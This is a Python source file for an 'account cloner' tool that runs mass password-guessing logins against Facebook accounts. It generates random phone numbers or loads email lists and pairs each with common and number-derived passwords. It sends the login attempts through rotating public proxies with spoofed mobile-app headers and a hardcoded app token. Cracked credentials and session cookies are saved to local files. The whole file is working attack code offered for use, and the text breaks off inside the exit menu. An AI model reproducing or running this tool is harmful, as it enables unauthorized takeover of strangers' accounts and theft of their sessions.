import os
import random
import string
import time
import uuid
import requests
import json
import base64
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import sys
import platform
import socket
import re
import math
from threading import Thread
from queue import Queue

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[35m'
    WHITE = '\033[37m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    
    GRADIENT = [
        '\033[38;5;46m',  # Bright Green
        '\033[38;5;82m',  # Light Green
        '\033[38;5;118m', # Lime Green
        '\033[38;5;154m', # Yellow Green
        '\033[38;5;190m'  # Light Yellow
    ]
    
    @staticmethod
    def random_gradient():
        return random.choice(Colors.GRADIENT)

class Animations:
    @staticmethod
    def spinning_cursor():
        while True:
            for cursor in '|/-\\':
                yield cursor
    
    @staticmethod
    def progress_bar(percentage, width=50):
        filled = int(width * percentage // 100)
        return f"[{'█' * filled}{' ' * (width - filled)}] {percentage:.1f}%"

class Banner:
    @staticmethod
    def print():
        Utilities.clear()
        gradient = Colors.GRADIENT
        print(f"""{gradient[0]}
  ██████╗ ██████╗ ███╗   ██╗███████╗██╗ ██████╗ 
 ██╔════╝██╔═══██╗████╗  ██║██╔════╝██║██╔════╝ 
 ██║     ██║   ██║██╔██╗ ██║█████╗  ██║██║  ███╗
 ██║     ██║   ██║██║╚██╗██║██╔══╝  ██║██║   ██║
 ╚██████╗╚██████╔╝██║ ╚████║██║     ██║╚██████╔╝
  ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝     ╚═╝ ╚═════╝ 
{gradient[1]}██████╗ ███████╗███╗   ██╗██████╗ ███████╗███╗   ███╗
{gradient[2]}██╔══██╗██╔════╝████╗  ██║██╔══██╗██╔════╝████╗ ████║
{gradient[3]}██████╔╝█████╗  ██╔██╗ ██║██║  ██║█████╗  ██╔████╔██║
{gradient[4]}██╔══██╗██╔══╝  ██║╚██╗██║██║  ██║██╔══╝  ██║╚██╔╝██║
{gradient[0]}██║  ██║███████╗██║ ╚████║██████╔╝███████╗██║ ╚═╝ ██║
{gradient[1]}╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝     ╚═╝
{gradient[2]}╔══════════════════════════════════════════════════╗
{gradient[3]}║{Colors.BOLD}       ADVANCED ACCOUNT CLONER TOOL 2025      {gradient[2]}║
{gradient[4]}╠══════════════════════════════════════════════════╣
{gradient[0]}║ {gradient[1]}Author   : FFKING0011 & K14M-69              {gradient[2]}║
{gradient[1]}║ {gradient[2]}Version  : 2025 VIP Edition                 {gradient[3]}║
{gradient[2]}║ {gradient[3]}Team     : EHC CYBER TEAM                   {gradient[4]}║
{gradient[3]}║ {gradient[4]}Github   : github.com/FFKING0011             {gradient[0]}║
{gradient[4]}╚══════════════════════════════════════════════════╝{Colors.END}""")

class Utilities:
    @staticmethod
    def clear():
        os.system('clear' if os.name == 'posix' else 'cls')
    
    @staticmethod
    def get_ip_address():
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            return ip_address
        except:
            return "127.0.0.1"
    
    @staticmethod
    def get_device_info():
        return {
            "system": platform.system(),
            "release": platform.release(),
            "machine": platform.machine(),
            "processor": platform.processor()
        }
    
    @staticmethod
    def validate_email(email):
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email)
    
    @staticmethod
    def validate_phone(phone):
        pattern = r'^\+?[0-9]{10,15}$'
        return re.match(pattern, phone)
    
    @staticmethod
    def countdown(seconds):
        for i in range(seconds, 0, -1):
            print(f"\r{Colors.YELLOW}Waiting for {i} seconds...{Colors.END}", end="")
            time.sleep(1)
        print("\r" + " " * 30 + "\r", end="")

class IDGenerator:
    @staticmethod
    def generate_bangladesh_numbers(code, limit):
        numbers = []
        for _ in range(limit):
            part1 = ''.join(random.choice(string.digits) for _ in range(2))
            part2 = ''.join(random.choice(string.digits) for _ in range(2))
            part3 = ''.join(random.choice(string.digits) for _ in range(4))
            numbers.append(f"{code}{part1}{part2}{part3}")
        return numbers
    
    @staticmethod
    def generate_international_numbers(code, limit):
        numbers = []
        length_map = {
            '+1': 10,    # USA/Canada
            '+44': 10,    # UK
            '+33': 9,     # France
            '+49': 10,    # Germany
            '+7': 10,     # Russia
            '+81': 10     # Japan
        }
        length = length_map.get(code, 10)
        for _ in range(limit):
            numbers.append(f"{code}{''.join(random.choice(string.digits) for _ in range(length))}")
        return numbers
    
    @staticmethod
    def generate_random_emails(limit):
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'protonmail.com']
        emails = []
        for _ in range(limit):
            username = ''.join(random.choice(string.ascii_lowercase) for _ in range(random.randint(5, 10)))
            domain = random.choice(domains)
            emails.append(f"{username}@{domain}")
        return emails

class AutoScroller:
    def __init__(self, items, display_func, speed=1.0):
        self.items = items
        self.display_func = display_func
        self.speed = speed
        self.current_index = 0
        self.running = False
        self.thread = None
    
    def start(self):
        self.running = True
        self.thread = Thread(target=self._scroll)
        self.thread.start()
    
    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join()
    
    def _scroll(self):
        while self.running and self.current_index < len(self.items):
            percentage = (self.current_index + 1) / len(self.items) * 100
            self.display_func(self.items[self.current_index], percentage)
            self.current_index += 1
            time.sleep(1.0 / self.speed)
        
        if self.current_index >= len(self.items):
            print(f"\n{Colors.GREEN}✅ All IDs processed successfully!{Colors.END}")

class AdvancedCloner:
    def __init__(self):
        self.ok = []
        self.cp = []
        self.loop = 0
        self.user = []
        self.proxies = []
        self.session = requests.Session()
        self.total_attempts = 0
        self.start_time = time.time()
        self.load_proxies()
        self.spinner = Animations.spinning_cursor()
        self.config = {
            "delay_after_success": 30,
            "airplane_mode_interval": 180,
            "max_threads": 50,
            "auto_switch_proxy": True,
            "save_results": True,
            "auto_scroll_speed": 2.0
        }
        self.country_codes = {
            'bangladesh': {
                '017': 'Grameenphone',
                '019': 'Banglalink',
                '018': 'Robi',
                '016': 'Airtel',
                '013': 'Grameenphone'
            },
            'international': {
                '+1': 'USA/Canada',
                '+44': 'UK',
                '+33': 'France',
                '+49': 'Germany',
                '+7': 'Russia',
                '+81': 'Japan'
            }
        }
        self.current_operation = None
        self.scroller = None
    
    def load_proxies(self):
        try:
            proxy_sources = [
                'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4',
                'https://www.proxy-list.download/api/v1/get?type=socks4',
                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt',
                'https://raw.githubusercontent.com/jetkai/proxy-list/main/online/socks4.txt'
            ]
            
            print(f"{Colors.BLUE}⏳ Loading proxies from {len(proxy_sources)} sources...{Colors.END}")
            
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(self.fetch_proxies, url) for url in proxy_sources]
                for future in futures:
                    try:
                        proxies = future.result()
                        self.proxies.extend(proxies)
                    except:
                        continue
            
            self.proxies = list(set([p.strip() for p in self.proxies if p.strip()]))
            
            if not self.proxies:
                self.proxies = ["none"]
                print(f"{Colors.RED}⚠ No proxies loaded. Using direct connection.{Colors.END}")
            else:
                print(f"{Colors.GREEN}✅ Loaded {len(self.proxies)} proxies successfully!{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}❌ Error loading proxies: {str(e)}{Colors.END}")
            self.proxies = ["none"]
    
    def fetch_proxies(self, url):
        try:
            response = requests.get(url, timeout=15)
            if response.status_code == 200:
                return response.text.splitlines()
        except:
            return []
        return []
    
    def get_random_proxy(self):
        if self.proxies and self.proxies[0] != "none":
            proxy = random.choice(self.proxies)
            if self.config["auto_switch_proxy"]:
                self.proxies.remove(proxy)
                self.proxies.append(proxy)
            return proxy
        return None
    
    def generate_random_number(self, length):
        return ''.join(random.choice(string.digits) for _ in range(length))
    
    def generate_password_variations(self, uid, country_code):
        base_passwords = []
        
        if country_code in ['017', '018', '019', '016', '013']:  # Bangladesh
            base_passwords = [
                uid, uid[3:], uid[-4:], uid[:3] + uid[-4:],
                'bangladesh', 'Bangladesh', '786786', '112233',
                '12345678', uid[:4] + uid[-4:], 'iloveyou',
                'password', 'qwertyuiop', uid[3:6] + uid[-4:]
            ]
        elif country_code in ['+91', '+92']:  # India/Pakistan
            base_passwords = [
                uid[-10:], uid[-8:], uid[-6:], '786786',
                '57273200', '59039200', '57575751', '112233',
                'pakistan' if country_code == '+92' else 'india123',
                'password', '123456', '12345678', 'qwerty', 'abc123'
            ]
        else:  # International
            base_passwords = [
                uid[-10:], uid[-8:], uid[-6:], 'password',
                '123456', '12345678', 'qwerty', 'abc123',
                'letmein', 'welcome', 'monkey', 'sunshine',
                'password1', 'admin123'
            ]
        
        variations = []
        for pwd in base_passwords:
            variations.extend([
                pwd, pwd + '123', pwd + '!', pwd.upper(),
                pwd.capitalize(), pwd[::-1], pwd + '2023',
                pwd + '2024', pwd + '@', pwd + '#'
            ])
        
        return list(set(variations))[:20]
    
    def display_id_with_percentage(self, uid, percentage):
        progress_bar = Animations.progress_bar(percentage)
        print(f"\r{Colors.GRADIENT[0]}[{next(self.spinner)}] {Colors.GRADIENT[1]}Processing: {uid} {progress_bar}", end="")
    
    def print_status(self):
        elapsed_time = time.time() - self.start_time
        hours, rem = divmod(elapsed_time, 3600)
        minutes, seconds = divmod(rem, 60)
        
        total_minutes = max(1, elapsed_time / 60)
        speed = self.total_attempts / total_minutes
        
        proxy_count = len(self.proxies) if self.proxies[0] != "none" else 0
        
        status = (
            f"{Colors.GRADIENT[0]}[{next(self.spinner)}] "
            f"{Colors.GRADIENT[1]}OK: {Colors.BOLD}{len(self.ok)}{Colors.END}{Colors.GRADIENT[1]} | "
            f"{Colors.GRADIENT[2]}CP: {Colors.BOLD}{len(self.cp)}{Colors.END}{Colors.GRADIENT[2]} | "
            f"{Colors.GRADIENT[3]}Attempts: {Colors.BOLD}{self.total_attempts}{Colors.END}{Colors.GRADIENT[3]} | "
            f"{Colors.GRADIENT[4]}Speed: {Colors.BOLD}{speed:.1f}/min{Colors.END}{Colors.GRADIENT[4]} | "
            f"{Colors.GRADIENT[0]}Time: {Colors.BOLD}{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}{Colors.END}{Colors.GRADIENT[0]} | "
            f"{Colors.GRADIENT[1]}Proxy: {Colors.BOLD}{proxy_count}{Colors.END}"
        )
        
        print(f"\r{status}", end="")
    
    def airplane_mode_toggle(self):
        print(f"\n{Colors.YELLOW}🛫 Simulating airplane mode toggle...{Colors.END}")
        time.sleep(5)
        print(f"{Colors.GREEN}🛬 Airplane mode disabled, resuming operations...{Colors.END}")
    
    def generate_advanced_headers(self):
        devices = [
            {
                "model": "SM-G950U",
                "density": "3.0",
                "width": "1080",
                "height": "2076",
                "brand": "samsung",
                "android_version": "9"
            },
            {
                "model": "RMX1945",
                "density": "2.25",
                "width": "720",
                "height": "1400",
                "brand": "Realme",
                "android_version": "9"
            },
            {
                "model": "RMX2021",
                "density": "2.0",
                "width": "720",
                "height": "1456",
                "brand": "realme",
                "android_version": "10"
            },
            {
                "model": "iPhone12,1",
                "density": "3.0",
                "width": "828",
                "height": "1792",
                "brand": "Apple",
                "ios_version": "14.4"
            }
        ]
        
        device = random.choice(devices)
        
        if "iPhone" in device["model"]:
            user_agent = f"Instagram 265.0.0.19.301 iOS ({device['model']}; {device['ios_version']}; en_US; en; scale={device['density']})"
        else:
            user_agent = (
                f"[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;"
                f"FBDM/{{density={device['density']},width={device['width']},height={device['height']}}};"
                f"FBLC/en_US;FBRV/0;FBCR/;FBMF/{device['brand']};FBBD/{device['brand']};"
                f"FBPN/com.facebook.katana;FBDV/{device['model']};FBSV/{device['android_version']};"
                f"FBOP/1;FBCA/arm64-v8a:;]"
            )
        
        headers = {
            'User-Agent': user_agent,
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(2000, 4000)),
            'X-FB-SIM-HNI': str(random.randint(2000, 4000)),
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type': 'WIFI',
            'X-Tigon-Is-Retry': 'False',
            'x-fb-session-id': f'nid=jiZ+yNNBgbwC;pid=Main;tid={random.randint(100,999)};nc=1;fc=0;bc=0;cid={str(uuid.uuid4())}',
            'x-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': str(uuid.uuid4()),
            'Accept-Language': 'en-US',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-App-ID': '567067343352427'
        }
        
        return headers
    
    def crack_account(self, uid, password):
        self.total_attempts += 1
        proxy = self.get_random_proxy()
        proxy_dict = {'http': f'socks4://{proxy}', 'https': f'socks4://{proxy}'} if proxy else None
        
        data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': password,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate',
            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        }
        
        try:
            response = self.session.post(
                'https://b-graph.facebook.com/auth/login',
                data=data,
                headers=self.generate_advanced_headers(),
                proxies=proxy_dict,
                timeout=15
            )
            
            result = response.json()
            
            if 'access_token' in result:
                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                
                print(f"\n{Colors.GREEN}╔══════════════════════════════════════════════════╗")
                print(f"║ {Colors.BOLD}{Colors.WHITE}🔥 SUCCESSFUL LOGIN! {Colors.GREEN}║")
                print(f"╠══════════════════════════════════════════════════╣")
                print(f"║ {Colors.CYAN}📱 UID: {uid}{Colors.GREEN}║")
                print(f"║ {Colors.MAGENTA}🔑 Password: {password}{Colors.GREEN}║")
                print(f"║ {Colors.YELLOW}🛡️ Proxy: {proxy if proxy else 'Direct'}{Colors.GREEN}║")
                print(f"╠══════════════════════════════════════════════════╣")
                print(f"║ {Colors.WHITE}🍪 Cookie: {coki[:50]}...{Colors.GREEN}║")
                print(f"╚══════════════════════════════════════════════════╝{Colors.END}")
                
                if self.config["save_results"]:
                    with open('/sdcard/FFKING0011-OK.txt', 'a') as f:
                        f.write(f"{uid}|{password}|{coki}\n")
                    with open('/sdcard/FFKING0011-COOKIES.txt', 'a') as f:
                        f.write(f"{coki}\n")
                
                self.ok.append(uid)
                return True
                
            elif 'www.facebook.com' in str(result):
                print(f"\n{Colors.YELLOW}╔══════════════════════════════════════════════════╗")
                print(f"║ {Colors.BOLD}{Colors.WHITE}⚠ CHECKPOINT ACCOUNT {Colors.YELLOW}║")
                print(f"╠══════════════════════════════════════════════════╣")
                print(f"║ {Colors.CYAN}📱 UID: {uid}{Colors.YELLOW}║")
                print(f"║ {Colors.MAGENTA}🔑 Password: {password}{Colors.YELLOW}║")
                print(f"║ {Colors.RED}🛡️ Proxy: {proxy if proxy else 'Direct'}{Colors.YELLOW}║")
                print(f"╚══════════════════════════════════════════════════╝{Colors.END}")
                
                if self.config["save_results"]:
                    with open('/sdcard/FFKING0011-CP.txt', 'a') as f:
                        f.write(f"{uid}|{password}\n")
                
                self.cp.append(uid)
                return True
                
        except Exception as e:
            if "--debug" in sys.argv:
                print(f"\n{Colors.RED}❌ Error: {str(e)}{Colors.END}")
            return False
        
        return False
    
    def bangladesh_cloning(self):
        Banner.print()
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}1{Colors.GRADIENT[0]}] {Colors.GRADIENT[1]}017 (Grameenphone)")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}2{Colors.GRADIENT[0]}] {Colors.GRADIENT[2]}019 (Banglalink)")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}3{Colors.GRADIENT[0]}] {Colors.GRADIENT[3]}018 (Robi)")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}4{Colors.GRADIENT[0]}] {Colors.GRADIENT[4]}016 (Airtel)")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}5{Colors.GRADIENT[0]}] {Colors.GRADIENT[0]}013 (Grameenphone){Colors.END}")
        print(f"{Colors.GRADIENT[0]}══════════════════════════════════════════════════{Colors.END}")
        
        choice = input(f"{Colors.BOLD}{Colors.WHITE}Select operator code: {Colors.END}")
        codes = {
            '1': '017',
            '2': '019',
            '3': '018',
            '4': '016',
            '5': '013'
        }
        code = codes.get(choice, '017')
        
        limit = int(input(f"{Colors.BOLD}{Colors.WHITE}How many IDs to generate: {Colors.END}"))
        
        # Generate IDs with auto-scroll and percentage
        self.user = IDGenerator.generate_bangladesh_numbers(code, limit)
        self.current_operation = f"Bangladesh ({code})"
        self.start_cloning_with_auto_scroll(code, "Bangladesh")
    
    def india_pakistan_cloning(self):
        Banner.print()
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}1{Colors.GRADIENT[0]}] {Colors.GRADIENT[1]}+91 (India)")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}2{Colors.GRADIENT[0]}] {Colors.GRADIENT[2]}+92 (Pakistan)")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}3{Colors.GRADIENT[0]}] {Colors.GRADIENT[3]}+880 (Bangladesh)")
        print(f"{Colors.GRADIENT[0]}══════════════════════════════════════════════════{Colors.END}")
        
        choice = input(f"{Colors.BOLD}{Colors.WHITE}Select country code: {Colors.END}")
        codes = {
            '1': '+91',
            '2': '+92',
            '3': '+880'
        }
        code = codes.get(choice, '+91')
        
        limit = int(input(f"{Colors.BOLD}{Colors.WHITE}How many IDs to generate: {Colors.END}"))
        
        self.user = []
        for _ in range(limit):
            nmp = self.generate_random_number(10)
            self.user.append(code + nmp)
        
        self.current_operation = f"India/Pakistan ({code})"
        self.start_cloning_with_auto_scroll(code, "India/Pakistan")
    
    def international_cloning(self):
        Banner.print()
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}1{Colors.GRADIENT[0]}] {Colors.GRADIENT[1]}+1 (USA/Canada)")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}2{Colors.GRADIENT[0]}] {Colors.GRADIENT[2]}+44 (UK)")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}3{Colors.GRADIENT[0]}] {Colors.GRADIENT[3]}+33 (France)")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}4{Colors.GRADIENT[0]}] {Colors.GRADIENT[4]}+49 (Germany)")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}5{Colors.GRADIENT[0]}] {Colors.GRADIENT[0]}+7 (Russia)")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}6{Colors.GRADIENT[0]}] {Colors.GRADIENT[1]}+81 (Japan)")
        print(f"{Colors.GRADIENT[0]}══════════════════════════════════════════════════{Colors.END}")
        
        choice = input(f"{Colors.BOLD}{Colors.WHITE}Select country code: {Colors.END}")
        codes = {
            '1': '+1',
            '2': '+44',
            '3': '+33',
            '4': '+49',
            '5': '+7',
            '6': '+81'
        }
        code = codes.get(choice, '+1')
        
        limit = int(input(f"{Colors.BOLD}{Colors.WHITE}How many IDs to generate: {Colors.END}"))
        
        self.user = IDGenerator.generate_international_numbers(code, limit)
        self.current_operation = f"International ({code})"
        self.start_cloning_with_auto_scroll(code, "International")
    
    def email_cloning(self):
        Banner.print()
        print(f"{Colors.GRADIENT[0]}📧 EMAIL CLONING MODE{Colors.END}")
        print(f"{Colors.GRADIENT[0]}══════════════════════════════════════════════════{Colors.END}")
        
        email_file = input(f"{Colors.BOLD}{Colors.WHITE}Enter email list file path: {Colors.END}")
        
        try:
            with open(email_file, 'r') as f:
                self.user = [email.strip() for email in f.readlines() if Utilities.validate_email(email.strip())]
            
            if not self.user:
                print(f"{Colors.RED}❌ No valid emails found in the file!{Colors.END}")
                time.sleep(2)
                return
            
            print(f"{Colors.GREEN}✅ Loaded {len(self.user)} valid emails.{Colors.END}")
            
            self.current_operation = "Email Cloning"
            self.start_cloning_with_auto_scroll("email", "Email")
        
        except FileNotFoundError:
            print(f"{Colors.RED}❌ File not found!{Colors.END}")
            time.sleep(2)
    
    def start_cloning_with_auto_scroll(self, country_code, country_name):
        Banner.print()
        print(f"{Colors.BOLD}{Colors.CYAN}🌍 Country: {country_name}")
        print(f"📱 Total IDs: {len(self.user)}")
        print(f"🔌 Proxy Count: {len(self.proxies) if self.proxies[0] != 'none' else 0}")
        print(f"⏱️ Auto-delay: {self.config['delay_after_success']} seconds after success")
        print(f"🛫 Airplane mode: Every {self.config['airplane_mode_interval']} seconds")
        print(f"🧵 Threads: {self.config['max_threads']}")
        print(f"══════════════════════════════════════════════════{Colors.END}")
        
        input(f"{Colors.BOLD}{Colors.WHITE}Press ENTER to start cloning...{Colors.END}")
        
        self.ok = []
        self.cp = []
        self.total_attempts = 0
        self.start_time = time.time()
        last_airplane_toggle = time.time()
        
        # Start auto-scroller in a separate thread
        self.scroller = AutoScroller(
            self.user,
            self.display_id_with_percentage,
            speed=self.config["auto_scroll_speed"]
        )
        self.scroller.start()
        
        try:
            with ThreadPoolExecutor(max_workers=self.config["max_threads"]) as executor:
                futures = []
                for uid in self.user:
                    passwords = self.generate_password_variations(uid, country_code)
                    
                    for password in passwords:
                        futures.append(executor.submit(self.crack_account, uid, password))
                        
                        current_time = time.time()
                        if current_time - last_airplane_toggle > self.config["airplane_mode_interval"]:
                            self.airplane_mode_toggle()
                            last_airplane_toggle = current_time
                        
                        time.sleep(0.1)
                    
                    self.print_status()
                
                for future in futures:
                    future.result()
        
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}🚨 Cloning process interrupted by user!{Colors.END}")
            if self.scroller:
                self.scroller.stop()
        
        self.show_results()
    
    def show_results(self):
        if self.scroller:
            self.scroller.stop()
        
        elapsed_time = time.time() - self.start_time
        hours, rem = divmod(elapsed_time, 3600)
        minutes, seconds = divmod(rem, 60)
        
        total_hits = len(self.ok) + len(self.cp)
        success_rate = (total_hits / max(1, self.total_attempts)) * 100
        
        print(f"\n{Colors.GREEN}╔══════════════════════════════════════════════════╗")
        print(f"║ {Colors.BOLD}{Colors.WHITE}🎉 CLONING PROCESS COMPLETED! {Colors.GREEN}║")
        print(f"╠══════════════════════════════════════════════════╣")
        print(f"║ {Colors.CYAN}⏱️ Time Taken: {int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}{Colors.GREEN}║")
        print(f"║ {Colors.MAGENTA}📊 Total Attempts: {self.total_attempts}{Colors.GREEN}║")
        print(f"║ {Colors.YELLOW}✅ Successful: {len(self.ok)}{Colors.GREEN}║")
        print(f"║ {Colors.RED}⚠ Checkpoints: {len(self.cp)}{Colors.GREEN}║")
        print(f"║ {Colors.BLUE}📈 Success Rate: {success_rate:.2f}%{Colors.GREEN}║")
        print(f"║ {Colors.WHITE}🚀 Speed: {self.total_attempts/max(1, elapsed_time):.1f} attempts/sec{Colors.GREEN}║")
        print(f"╚══════════════════════════════════════════════════╝{Colors.END}")
        
        if self.config["save_results"]:
            with open('/sdcard/FFKING0011-RESULTS.txt', 'a') as f:
                f.write(f"\n=== Session Results [{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ===\n")
                f.write(f"Operation: {self.current_operation}\n")
                f.write(f"Total Attempts: {self.total_attempts}\n")
                f.write(f"Successful: {len(self.ok)}\n")
                f.write(f"Checkpoints: {len(self.cp)}\n")
                f.write(f"Success Rate: {success_rate:.2f}%\n")
                f.write(f"Time Taken: {int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}\n")
        
        input(f"{Colors.BOLD}{Colors.WHITE}Press ENTER to return to menu...{Colors.END}")
        self.main_menu()
    
    def settings_menu(self):
        Banner.print()
        print(f"{Colors.GRADIENT[0]}⚙️ TOOL SETTINGS{Colors.END}")
        print(f"{Colors.GRADIENT[0]}══════════════════════════════════════════════════{Colors.END}")
        
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}1{Colors.GRADIENT[0]}] {Colors.GRADIENT[1]}Success Delay: {self.config['delay_after_success']}s")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}2{Colors.GRADIENT[0]}] {Colors.GRADIENT[2]}Airplane Mode Interval: {self.config['airplane_mode_interval']}s")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}3{Colors.GRADIENT[0]}] {Colors.GRADIENT[3]}Max Threads: {self.config['max_threads']}")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}4{Colors.GRADIENT[0]}] {Colors.GRADIENT[4]}Auto Switch Proxy: {'ON' if self.config['auto_switch_proxy'] else 'OFF'}")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}5{Colors.GRADIENT[0]}] {Colors.GRADIENT[0]}Save Results: {'ON' if self.config['save_results'] else 'OFF'}")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}6{Colors.GRADIENT[0]}] {Colors.GRADIENT[1]}Auto-Scroll Speed: {self.config['auto_scroll_speed']}x")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}0{Colors.GRADIENT[0]}] {Colors.GRADIENT[2]}Back to Main Menu{Colors.END}")
        print(f"{Colors.GRADIENT[0]}══════════════════════════════════════════════════{Colors.END}")
        
        choice = input(f"{Colors.BOLD}{Colors.WHITE}Select option: {Colors.END}")
        
        if choice == '1':
            delay = int(input(f"{Colors.BOLD}{Colors.WHITE}Enter delay after success (seconds): {Colors.END}"))
            self.config['delay_after_success'] = max(5, delay)
            print(f"{Colors.GREEN}✅ Success delay set to {self.config['delay_after_success']} seconds.{Colors.END}")
            time.sleep(1)
            self.settings_menu()
        elif choice == '2':
            interval = int(input(f"{Colors.BOLD}{Colors.WHITE}Enter airplane mode interval (seconds): {Colors.END}"))
            self.config['airplane_mode_interval'] = max(60, interval)
            print(f"{Colors.GREEN}✅ Airplane mode interval set to {self.config['airplane_mode_interval']} seconds.{Colors.END}")
            time.sleep(1)
            self.settings_menu()
        elif choice == '3':
            threads = int(input(f"{Colors.BOLD}{Colors.WHITE}Enter max threads (5-100): {Colors.END}"))
            self.config['max_threads'] = max(5, min(100, threads))
            print(f"{Colors.GREEN}✅ Max threads set to {self.config['max_threads']}.{Colors.END}")
            time.sleep(1)
            self.settings_menu()
        elif choice == '4':
            self.config['auto_switch_proxy'] = not self.config['auto_switch_proxy']
            print(f"{Colors.GREEN}✅ Auto switch proxy {'ENABLED' if self.config['auto_switch_proxy'] else 'DISABLED'}.{Colors.END}")
            time.sleep(1)
            self.settings_menu()
        elif choice == '5':
            self.config['save_results'] = not self.config['save_results']
            print(f"{Colors.GREEN}✅ Save results {'ENABLED' if self.config['save_results'] else 'DISABLED'}.{Colors.END}")
            time.sleep(1)
            self.settings_menu()
        elif choice == '6':
            speed = float(input(f"{Colors.BOLD}{Colors.WHITE}Enter auto-scroll speed (0.5-5.0): {Colors.END}"))
            self.config['auto_scroll_speed'] = max(0.5, min(5.0, speed))
            print(f"{Colors.GREEN}✅ Auto-scroll speed set to {self.config['auto_scroll_speed']}x.{Colors.END}")
            time.sleep(1)
            self.settings_menu()
        elif choice == '0':
            self.main_menu()
        else:
            print(f"{Colors.RED}❌ Invalid option!{Colors.END}")
            time.sleep(1)
            self.settings_menu()
    
    def main_menu(self):
        Banner.print()
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}1{Colors.GRADIENT[0]}] {Colors.GRADIENT[1]}Bangladesh Cloning (Auto)")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}2{Colors.GRADIENT[0]}] {Colors.GRADIENT[2]}India/Pakistan Cloning (Auto)")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}3{Colors.GRADIENT[0]}] {Colors.GRADIENT[3]}International Cloning (Auto)")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}4{Colors.GRADIENT[0]}] {Colors.GRADIENT[4]}Email Cloning")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}5{Colors.GRADIENT[0]}] {Colors.GRADIENT[0]}Tool Settings")
        print(f"{Colors.GRADIENT[0]}[{Colors.WHITE}0{Colors.GRADIENT[0]}] {Colors.GRADIENT[1]}Exit Tool{Colors.END}")
        print(f"{Colors.GRADIENT[0]}══════════════════════════════════════════════════{Colors.END}")
        
        choice = input(f"{Colors.BOLD}{Colors.WHITE}Select option: {Colors.END}")
        
        if choice == '1':
            self.bangladesh_cloning()
        elif choice == '2':
            self.india_pakistan_cloning()
        elif choice == '3':
            self.international_cloning()
        elif choice == '4':
            self.email_cloning()
        elif choice == '5':
            self.settings_menu()
        elif choice == '0':
            Utilities.clear()
            print(f"{Colors.GREEN}╔══════════════════════════════════════════════════╗")
            print(f"║ {Colors.BOLD}{Colors.WHITE}Thanks for using FFKING0011 & K14M-69 Tools! {Colors.GREEN}║")
            print(f"║ {Colors.CYAN}See you next time! 👋{Colors.GREEN}║")
